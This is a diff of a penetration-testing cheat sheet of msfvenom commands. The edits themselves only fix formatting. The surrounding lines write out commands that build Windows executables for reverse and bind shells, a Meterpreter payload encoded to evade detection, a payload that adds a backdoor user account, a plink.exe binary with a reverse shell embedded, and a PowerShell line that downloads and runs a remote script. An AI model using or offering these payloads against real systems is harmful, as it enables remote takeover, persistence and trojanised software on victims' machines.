@@ -24,7 +24,7 @@ One can also use the -a to specify the architecture or the --platform
 <pre>msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe </pre>
 **Create User**
 <pre>msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe </pre>
-**CMD Shell*
+**CMD Shell**
 <pre> msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe </pre>
 **Execute Command**
 <pre> msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe </pre>
@@ -32,7 +32,7 @@ One can also use the -a to specify the architecture or the --platform
 **Encoder**
 <pre>msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe </pre>
 **Embedded inside executable**
-<pre>msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe </pre>
+<pre>msfvenom -p windows/shell_reverse_tcp LHOST=(IP) LPORT=(PORT) -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe </pre>
 
 **Linux Payloads**
 ---
